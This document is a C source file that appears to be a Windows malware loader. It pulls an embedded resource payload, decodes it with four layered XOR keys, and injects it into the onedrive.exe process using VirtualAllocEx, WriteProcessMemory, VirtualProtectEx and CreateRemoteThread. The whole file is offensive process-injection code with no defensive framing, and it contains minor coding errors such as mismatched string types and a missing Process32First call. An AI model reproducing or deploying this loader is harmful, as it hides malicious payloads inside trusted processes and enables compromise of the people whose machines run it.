#include <Windows.h>
#undef UNICODE // This is required for proper name parsing
#include <ctype.h>
#include <Tlhelp32.h>

BOOL GetProcessHandle(LPWSTR sProcessName, DWORD* iProcessID, HANDLE* hProcess)
{
	// Get snapshot
	HANDLE hSnapshot = NULL;
	PROCESSENTRY32 pProcess = { .dwSize = sizeof(PROCESSENTRY32) };
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	do {
		// Lower image name for compare
		for (int i = 0; pProcess.szExeFile[i]; i++) {
			pProcess.szExeFile[i] = tolower(pProcess.szExeFile[i]);
		}
		// Find target process and return
		if (strcmp(pProcess.szExeFile, sProcessName) == 0) {
			*iProcessID = pProcess.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pProcess.th32ProcessID);
		}
	} while (Process32Next(hSnapshot, &pProcess));

	return EXIT_SUCCESS;

}

#include "resource.h"

typedef struct RsrcInfo {
	PVOID pWorkBuffer;
	SIZE_T sBufferSize;
}RsrcInfo;

RsrcInfo CloneRsrcPayload()
{
	HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	PVOID pPayload = LockResource(hGlobal);
	SIZE_T sPayloadSize = SizeofResource(NULL, hRsrc);
	PVOID pWorkBuffer = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(pWorkBuffer, pPayload, sPayloadSize);
	RsrcInfo ReturnInfo = { .pWorkBuffer = pWorkBuffer, .sBufferSize = sPayloadSize };
	return ReturnInfo;
}

int main()
{
	RsrcInfo sBufferInfo = CloneRsrcPayload();
	SIZE_T sPayloadSize = sBufferInfo.sBufferSize;
	PBYTE pPayload = sBufferInfo.pWorkBuffer;
BYTE pKey0[] = { 0xD1, 0x54, 0x36, 0x83, 0x2F, 0x1F, 0x61, 0x99, 0x6A, 0x3C, 0xE9, 0xA3, 0xA0, 0xD8, 0x95, 0x60, 0x67, 0xC8, 0x37, 0x67, 0xCA, 0x79, 0xD4, 0xBB, 0x8F, 0x2A, 0x05, 0x9F, 0xBC, 0x58, 0x9D, 0xAC };
BYTE pIV0[] = { 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00 };
BYTE pKey1[] = { 0x31, 0x38, 0x23, 0x10, 0x2D, 0x55, 0xD4, 0x24, 0xBE, 0x82, 0xEE, 0x32, 0xC0, 0x39, 0xD4, 0xA2, 0x4D, 0x3B, 0x0F, 0x65, 0xE0, 0x28, 0x96, 0x2C, 0xBA, 0x4D, 0x4C, 0xD8, 0x85, 0xBD, 0xCB, 0x32 };
BYTE pIV1[] = { 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00 };
BYTE pKey2[] = { 0x0C, 0x13, 0x49, 0x77, 0x6E, 0x38, 0x39, 0xC6, 0x62, 0xF3, 0x83, 0xBC, 0x44, 0x42, 0xF8, 0x76, 0x0B, 0x4E, 0xF0, 0x7B, 0x71, 0xFA, 0x8F, 0xF2, 0x55, 0xBC, 0x47, 0x12, 0x5D, 0xAC, 0x9E, 0xD9 };
BYTE pIV2[] = { 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00 };
BYTE pKey3[] = { 0xC7, 0x5E, 0xDD, 0x85, 0x50, 0x1B, 0xE7, 0xE7, 0xEB, 0x48, 0xA5, 0x1F, 0x30, 0xF1, 0x85, 0x32, 0x21, 0xDC, 0xC3, 0xB9, 0x04, 0x0E, 0xE0, 0x87, 0x6E, 0x91, 0x50, 0x8C, 0xA1, 0x75, 0x73, 0xF9 };
BYTE pIV3[] = { 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00 };
for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {
// if end of the key, start again 
	if (j >= 32)
	{
		j = 0;
	}
	pPayload[i] = pPayload[i] ^ pKey3[j];
}

for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {
// if end of the key, start again 
	if (j >= 32)
	{
		j = 0;
	}
	pPayload[i] = pPayload[i] ^ pKey2[j];
}

for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {
// if end of the key, start again 
	if (j >= 32)
	{
		j = 0;
	}
	pPayload[i] = pPayload[i] ^ pKey1[j];
}

for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {
// if end of the key, start again 
	if (j >= 32)
	{
		j = 0;
	}
	pPayload[i] = pPayload[i] ^ pKey0[j];
}
LPWSTR sProcessName = "onedrive.exe";
DWORD iProcessId = NULL;
HANDLE hProcess = NULL;
GetProcessHandle(sProcessName, &iProcessId, &hProcess);
LPVOID pProcess = VirtualAllocEx(hProcess, NULL, sPayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
WriteProcessMemory(hProcess, pProcess, pPayload, sPayloadSize, NULL);
DWORD proc = 0;
VirtualProtectEx(hProcess, pProcess, sPayloadSize, PAGE_EXECUTE_READ, &proc);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pProcess, NULL, 0, NULL);
WaitForSingleObject(hThread, 2000);
return EXIT_SUCCESS;
}